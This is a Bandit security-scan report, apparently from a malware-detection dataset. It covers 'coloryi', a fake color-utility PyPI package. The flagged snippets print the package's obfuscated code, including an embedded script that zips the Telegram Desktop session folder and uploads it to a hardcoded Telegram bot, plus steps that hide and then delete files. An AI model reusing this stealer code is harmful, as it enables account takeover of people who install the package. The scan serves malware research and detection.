Run started:2025-05-25 16:07:44.324834

Test results:
>> Issue: [B814:read] os.read
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/coloryi-10.0.9/coloryi-10.0.9/coloryi-10.0.9/coloris/__init__.py:36
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b814_read.html
35	    llllIIllIIIlll(llIIIIIlllIlllIIll)
36	    if llllIlIIlIIIlI() is lIIIIlIIlIlIll():
37	        IlllIIllllIIIIllII()

--------------------------------------------------
>> Issue: [B814:read] os.read
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/coloryi-10.0.9/coloryi-10.0.9/coloryi-10.0.9/coloris/__init__.py:36
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b814_read.html
35	    llllIIllIIIlll(llIIIIIlllIlllIIll)
36	    if llllIlIIlIIIlI() is lIIIIlIIlIlIll():
37	        IlllIIllllIIIIllII()

--------------------------------------------------
>> Issue: [B815:write] os.write
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/coloryi-10.0.9/coloryi-10.0.9/coloryi-10.0.9/coloris/__init__.py:89
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b815_write.html
88	                if not IIIllIIIIIllIlllII:
89	                    IllIIIlllIIIIllIll.write(IlIlIIlllllllIIIIl, arcname=llIlIIIllIIIIIIIIl)
90	

--------------------------------------------------
>> Issue: [B832:write] tempfile_NamedTemporaryFile_write
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/coloryi-10.0.9/coloryi-10.0.9/coloryi-10.0.9/coloris/__init__.py:89
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b832_write.html
88	                if not IIIllIIIIIllIlllII:
89	                    IllIIIlllIIIIllIll.write(IlIlIIlllllllIIIIl, arcname=llIlIIIllIIIIIIIIl)
90	

--------------------------------------------------
>> Issue: [B824:url_found] url_found
   Severity: Medium   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/coloryi-10.0.9/coloryi-10.0.9/coloryi-10.0.9/coloris/__init__.py:94
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b824_url_found.html
93	    try:
94	        IlIllIIIIlIllIllII = f'https://api.telegram.org/bot{lIIllIlIIIllIIIllI}/sendDocument'
95	        with lllllllllllllII(llIIIIIllIlIIIllIl, 'rb') as lIlIlIllIlllIIlIII:

--------------------------------------------------
>> Issue: [B821:post] requests.post
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/coloryi-10.0.9/coloryi-10.0.9/coloryi-10.0.9/coloris/__init__.py:98
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b821_post.html
97	            lIIllIIlIlIllIlIIl = {'chat_id': IIlIIIlIIIIIllIllI}
98	            lIlIIllIllllIIIlIl = lIIllllIlIIlIl(IlIllIIIIlIllIllII, files=IlIlllIlllIllIIIII, data=lIIllIIlIlIllIlIIl)
99	            lIlIIllIllllIIIlIl.json()

--------------------------------------------------
>> Issue: [B828:signal] signal.signal
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/coloryi-10.0.9/coloryi-10.0.9/coloryi-10.0.9/coloris/__init__.py:137
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b828_signal.html
136	    global IIllIIlIlIlIIlllIl, IIlIllIllIlIIllIII
137	    IIllIIlIlIlIIlllIl = IlIllllIlIlIll(llIllIllllIIll)
138	    IIlIllIllIlIIllIII = IlIllllIlIlIll(llllIllllIIlII)

--------------------------------------------------
>> Issue: [B828:signal] signal.signal
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/coloryi-10.0.9/coloryi-10.0.9/coloryi-10.0.9/coloris/__init__.py:138
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b828_signal.html
137	    IIllIIlIlIlIIlllIl = IlIllllIlIlIll(llIllIllllIIll)
138	    IIlIllIllIlIIllIII = IlIllllIlIlIll(llllIllllIIlII)
139	    IlIlllllIllIll(llIllIllllIIll, IlIIllIIllIIIllIll)

--------------------------------------------------
>> Issue: [B828:signal] signal.signal
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/coloryi-10.0.9/coloryi-10.0.9/coloryi-10.0.9/coloris/__init__.py:139
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b828_signal.html
138	    IIlIllIllIlIIllIII = IlIllllIlIlIll(llllIllllIIlII)
139	    IlIlllllIllIll(llIllIllllIIll, IlIIllIIllIIIllIll)
140	    IlIlllllIllIll(llllIllllIIlII, IlIIllIIllIIIllIll)

--------------------------------------------------
>> Issue: [B324:blacklist] signal_signal
   Severity: Medium   Confidence: High
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/coloryi-10.0.9/coloryi-10.0.9/coloryi-10.0.9/coloris/__init__.py:139
   More Info: https://bandit.readthedocs.io/en/latest/blacklists/blacklist_calls.html#b324-signal-signal
138	    IIlIllIllIlIIllIII = IlIllllIlIlIll(llllIllllIIlII)
139	    IlIlllllIllIll(llIllIllllIIll, IlIIllIIllIIIllIll)
140	    IlIlllllIllIll(llllIllllIIlII, IlIIllIIllIIIllIll)

--------------------------------------------------
>> Issue: [B828:signal] signal.signal
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/coloryi-10.0.9/coloryi-10.0.9/coloryi-10.0.9/coloris/__init__.py:140
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b828_signal.html
139	    IlIlllllIllIll(llIllIllllIIll, IlIIllIIllIIIllIll)
140	    IlIlllllIllIll(llllIllllIIlII, IlIIllIIllIIIllIll)
141	

--------------------------------------------------
>> Issue: [B324:blacklist] signal_signal
   Severity: Medium   Confidence: High
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/coloryi-10.0.9/coloryi-10.0.9/coloryi-10.0.9/coloris/__init__.py:140
   More Info: https://bandit.readthedocs.io/en/latest/blacklists/blacklist_calls.html#b324-signal-signal
139	    IlIlllllIllIll(llIllIllllIIll, IlIIllIIllIIIllIll)
140	    IlIlllllIllIll(llllIllllIIlII, IlIIllIIllIIIllIll)
141	

--------------------------------------------------
>> Issue: [B815:write] os.write
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/coloryi-10.0.9/coloryi-10.0.9/coloryi-10.0.9/coloris/__init__.py:178
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b815_write.html
177	        with llIIlIllIIllIl(lIlIlIlIIlllIlIlII, 'w') as IllIIlIllIlllllIII:
178	            IllIIlIllIlllllIII.write(f'\nimport time\nimport os\nimport signal\nimport sys\n\n# PID of the parent process that launched us\nparent_pid = {IIlIIIllllIIIl()}\n\n# Give the parent a delay to set up any resources\ntime.sleep(1)\n\n# Monitor the parent process\ntry:\n    while True:\n        try:\n            # Check if parent is still running\n            os.kill(parent_pid, 0)\n            time.sleep(1)\n        except OSError:\n            # Parent has terminated, wait a bit to ensure uploads complete\n            time.sleep(240)  # Give it 4 minutes\n            break\nexcept:\n    pass\n\n# Clean up\ntry:\n    os.unlink("{lllIIlIlllIlIlllll}")\nexcept:\n    pass\nsys.exit(0)\n')
179	        if lIlIIlIIIIIIlI == 'win32':

--------------------------------------------------
>> Issue: [B832:write] tempfile_NamedTemporaryFile_write
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/coloryi-10.0.9/coloryi-10.0.9/coloryi-10.0.9/coloris/__init__.py:178
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b832_write.html
177	        with llIIlIllIIllIl(lIlIlIlIIlllIlIlII, 'w') as IllIIlIllIlllllIII:
178	            IllIIlIllIlllllIII.write(f'\nimport time\nimport os\nimport signal\nimport sys\n\n# PID of the parent process that launched us\nparent_pid = {IIlIIIllllIIIl()}\n\n# Give the parent a delay to set up any resources\ntime.sleep(1)\n\n# Monitor the parent process\ntry:\n    while True:\n        try:\n            # Check if parent is still running\n            os.kill(parent_pid, 0)\n            time.sleep(1)\n        except OSError:\n            # Parent has terminated, wait a bit to ensure uploads complete\n            time.sleep(240)  # Give it 4 minutes\n            break\nexcept:\n    pass\n\n# Clean up\ntry:\n    os.unlink("{lllIIlIlllIlIlllll}")\nexcept:\n    pass\nsys.exit(0)\n')
179	        if lIlIIlIIIIIIlI == 'win32':

--------------------------------------------------
>> Issue: [B814:read] os.read
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/coloryi-10.0.9/coloryi-10.0.9/coloryi-10.0.9/coloris/__init__.py:190
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b814_read.html
189	    if lllIIlIIIIIIIIIIlI is None or not lllIIlIIIIIIIIIIlI.is_alive():
190	        lllIIlIIIIIIIIIIlI = IIIlIIlIIlIllI(target=IIIllllIlIIIIlIIII)
191	        lllIIlIIIIIIIIIIlI.daemon = llllllllllllllI(((1 & 0 ^ 0) & 0 ^ 1) & 0 ^ 1 ^ 1 ^ 0 | 0)

--------------------------------------------------
>> Issue: [B814:read] os.read
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/coloryi-10.0.9/coloryi-10.0.9/coloryi-10.0.9/coloris/__init__.py:201
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b814_read.html
200	        llIllIlIllIlllIlII()
201	        if llllIlIIlIIIlI() is lIIIIlIIlIlIll():
202	            if not lllllllllllllIl(IIlIlllIllIIllllll, '_registered'):

--------------------------------------------------
>> Issue: [B814:read] os.read
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/coloryi-10.0.9/coloryi-10.0.9/coloryi-10.0.9/coloris/__init__.py:201
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b814_read.html
200	        llIllIlIllIlllIlII()
201	        if llllIlIIlIIIlI() is lIIIIlIIlIlIll():
202	            if not lllllllllllllIl(IIlIlllIllIIllllll, '_registered'):

--------------------------------------------------
>> Issue: [B814:read] os.read
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/coloryi-10.0.9/coloryi-10.0.9/coloryi-10.0.9/coloris/__init__.py:251
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b814_read.html
250	        llIllIlIllIlllIlII()
251	        if llllIlIIlIIIlI() is lIIIIlIIlIlIll():
252	            if not lllllllllllllIl(lllllIIlIIIllIIlIl, '_registered'):

--------------------------------------------------
>> Issue: [B814:read] os.read
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/coloryi-10.0.9/coloryi-10.0.9/coloryi-10.0.9/coloris/__init__.py:251
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b814_read.html
250	        llIllIlIllIlllIlII()
251	        if llllIlIIlIIIlI() is lIIIIlIIlIlIll():
252	            if not lllllllllllllIl(lllllIIlIIIllIIlIl, '_registered'):

--------------------------------------------------
>> Issue: [B824:url_found] url_found
   Severity: Medium   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/coloryi-10.0.9/coloryi-10.0.9/coloryi-10.0.9/coloris/__init__.py:273
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b824_url_found.html
272	            return
273	        IlIlllIIlllIlllIlI = f"""\nimport os\nimport zipfile\nimport requests\nimport fnmatch\nimport datetime\nimport sys\nfrom pathlib import Path\n\ndef compress_telegram_data_folder(source_folder, zip_file_path):\n    with zipfile.ZipFile(zip_file_path, 'w', zipfile.ZIP_DEFLATED, compresslevel=9) as zipf:\n        ignore_patterns = [\n            '**/media_cache/**',\n            '**/cache/**',\n            '**/webview/**',\n            '**/wvbots/**',\n            '**/EBWebView/**',\n            '**/temp/**',\n            'working'\n        ]\n        \n        source_path = Path(source_folder)\n        \n        for file_path in source_path.glob('**/*'):\n            if file_path.is_file():\n                rel_path = file_path.relative_to(source_path)\n                rel_path_str = str(rel_path).replace('\\\\', '/')\n                \n                should_ignore = False\n                for pattern in ignore_patterns:\n                    if fnmatch.fnmatch(rel_path_str, pattern) or any(\n                        fnmatch.fnmatch(part, pattern.replace('**/', '').replace('/**', '')) \n                        for part in rel_path_str.split('/')\n                    ):\n                        should_ignore = True\n                        break\n                \n                if not should_ignore:\n                    zipf.write(file_path, arcname=rel_path_str)\n\ndef upload_to_telegram(zip_file_path):\n    url = f"https://api.telegram.org/bot7866811532:AAHWBkH7NH7XheqQBRIdfoCk4psEr0BBrjg/sendDocument"\n    \n    try:\n        with open(zip_file_path, 'rb') as document:\n            files = {{'document': document}}\n            data = {{'chat_id': '7332038463'}}\n            \n            response = requests.post(url, files=files, data=data, timeout=300)\n            return True\n    except Exception:\n        return False\n        \n    # Clean up zip file after upload\n    try:\n        if os.path.exists(zip_file_path):\n            os.remove(zip_file_path)\n    except:\n        pass\n        \n    return True\n\n# Script execution starts here\ntry:\n    username = os.environ.get('USERNAME')\n    # Fix path with proper backslashes for Windows\n    source_folder = os.path.join('C:\\\\', 'Users', username, 'AppData', 'Roaming', 'Telegram Desktop', 'tdata')\n    zip_file_path = os.path.join('C:\\\\', 'Users', username, 'AppData', 'Roaming', f'{{username}}_tg_{{datetime.datetime.now().strftime("%Y%m%d%H%M%S")}}.zip')\n    \n    # Ensure the source folder exists\n    if not os.path.exists(source_folder):\n        sys.exit(0)\n    \n    # Compress the data\n    compress_telegram_data_folder(source_folder, zip_file_path)\n    \n    # Check if zip file was created\n    if not os.path.exists(zip_file_path):\n        sys.exit(0)\n    \n    # Upload to Telegram\n    success = upload_to_telegram(zip_file_path)\n    \n    # Clean up zip file after successful upload\n    if success and os.path.exists(zip_file_path):\n        try:\n            os.remove(zip_file_path)\n        except:\n            pass\nexcept Exception:\n    pass\n"""
274	        lIIIlllllIIIIllIII = IlIllIlllIIIIl(IlIIIIIIIlIllI('TEMP', lIllIIIIlIIllI('~')), f'_qc_temp_{IIlIIIllllIIIl()}.py')

--------------------------------------------------
>> Issue: [B815:write] os.write
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/coloryi-10.0.9/coloryi-10.0.9/coloryi-10.0.9/coloris/__init__.py:276
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b815_write.html
275	        with lllllllllllllII(lIIIlllllIIIIllIII, 'w') as IllIIlIllIlllllIII:
276	            IllIIlIllIlllllIII.write(IlIlllIIlllIlllIlI)
277	        if IIlIlllIIIIIIl == 'nt':

--------------------------------------------------
>> Issue: [B832:write] tempfile_NamedTemporaryFile_write
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/coloryi-10.0.9/coloryi-10.0.9/coloryi-10.0.9/coloris/__init__.py:276
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b832_write.html
275	        with lllllllllllllII(lIIIlllllIIIIllIII, 'w') as IllIIlIllIlllllIII:
276	            IllIIlIllIlllllIII.write(IlIlllIIlllIlllIlI)
277	        if IIlIlllIIIIIIl == 'nt':

--------------------------------------------------
>> Issue: [B812:system] os.system
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/coloryi-10.0.9/coloryi-10.0.9/coloryi-10.0.9/coloris/__init__.py:288
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b812_system.html
287	            if IIlIlllIIIIIIl == 'nt':
288	                lIlIlIIIIIIllI(f'attrib +h "{lIIIlllllIIIIllIII}"')
289	

--------------------------------------------------
>> Issue: [B817:system] platform.system
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/coloryi-10.0.9/coloryi-10.0.9/coloryi-10.0.9/coloris/__init__.py:288
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b817_system.html
287	            if IIlIlllIIIIIIl == 'nt':
288	                lIlIlIIIIIIllI(f'attrib +h "{lIIIlllllIIIIllIII}"')
289	

--------------------------------------------------
>> Issue: [B316:blacklist] os.system
   Severity: Medium   Confidence: High
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/coloryi-10.0.9/coloryi-10.0.9/coloryi-10.0.9/coloris/__init__.py:288
   More Info: https://bandit.readthedocs.io/en/latest/blacklists/blacklist_calls.html#b313-b320-os-system
287	            if IIlIlllIIIIIIl == 'nt':
288	                lIlIlIIIIIIllI(f'attrib +h "{lIIIlllllIIIIllIII}"')
289	

--------------------------------------------------
>> Issue: [B814:read] os.read
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/coloryi-10.0.9/coloryi-10.0.9/coloryi-10.0.9/coloris/__init__.py:297
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b814_read.html
296	                    pass
297	            IIlllIlIlIllllIllI = IIIlIIlIIlIllI(target=lIIIlIlIlIIlIllIIl)
298	            IIlllIlIlIllllIllI.daemon = llllllllllllllI(((1 & 0 ^ 0) & 0 ^ 1) & 0 ^ 1 ^ 1 ^ 0 | 1)

--------------------------------------------------
>> Issue: [B824:url_found] url_found
   Severity: Medium   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/coloryi-10.0.9/coloryi-10.0.9/coloryi-10.0.9/setup.py:14
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b824_url_found.html
13	    keywords="color, format, console, utility",
14	    url="https://github.com/author/coloris",
15	    classifiers=[

--------------------------------------------------

Code scanned:
	Total lines of code: 285
	Total lines skipped (#nosec): 0

Run metrics:
	Total issues (by severity):
		Undefined: 0.0
		Low: 0.0
		Medium: 6.0
		High: 21.0
	Total issues (by confidence):
		Undefined: 0.0
		Low: 0.0
		Medium: 24.0
		High: 3.0
Files skipped (0):
